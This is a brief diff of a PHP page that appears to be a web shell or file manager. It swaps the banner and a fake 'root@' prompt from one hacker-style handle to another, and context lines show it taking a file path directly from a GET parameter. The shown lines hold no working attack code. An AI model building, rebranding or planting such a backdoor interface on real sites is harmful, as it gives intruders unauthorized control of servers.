@@ -57,9 +57,9 @@ border-radius:5px;
 </style>
 </head>
 <body>
-<h1><center><font color="#ff00ff">Jarots</font></center></h1>
+<h1><center><font color="#ff00ff">RimaAgustin</font></center></h1>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td><font color="#ff00ff">root@Jarots</font> ';
+<tr><td><font color="#ff00ff">root@Rima</font> ';
 if(isset($_GET['path'])){
 $path = $_GET['path'];
 }else{
